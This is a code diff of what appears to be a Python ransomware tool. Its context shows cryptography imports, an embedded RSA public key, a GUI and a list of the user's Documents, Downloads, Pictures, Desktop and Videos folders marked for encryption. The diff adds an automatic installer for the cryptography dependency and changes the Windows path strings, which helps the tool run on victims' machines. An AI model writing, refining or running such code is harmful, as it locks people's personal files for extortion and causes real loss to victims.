@@ -1,3 +1,26 @@
+import subprocess
+import sys
+
+def install_dependencies():
+    """
+    Checks for and installs the 'cryptography' library if it's not found.
+    """
+    try:
+        import cryptography
+        
+    except ImportError:
+        
+        try:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
+            
+        except subprocess.CalledProcessError as e:
+            
+            print(f"Subprocess error: {e}")
+            sys.exit(1)
+
+
+install_dependencies()
+
 import tkinter as tk
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -179,7 +202,7 @@ qQIDAQAB
 
     home_dir = os.path.expanduser('~')
     # Specify the directories to encrypt
-    dirs = [home_dir+'\\Documents', home_dir+'\\Downloads', home_dir+'\\Pictures', home_dir+'\\Desktop', home_dir+'\\Videos', home_dir+'/Documents', home_dir+'/Downloads', home_dir+'/Pictures', home_dir+'/Desktop', home_dir+'/Videos']
+    dirs = [home_dir+'\Documents', home_dir+'\Downloads', home_dir+'\Pictures', home_dir+'\Desktop', home_dir+'\Videos', home_dir+'/Documents', home_dir+'/Downloads', home_dir+'/Pictures', home_dir+'/Desktop', home_dir+'/Videos']
 
 
     logo()
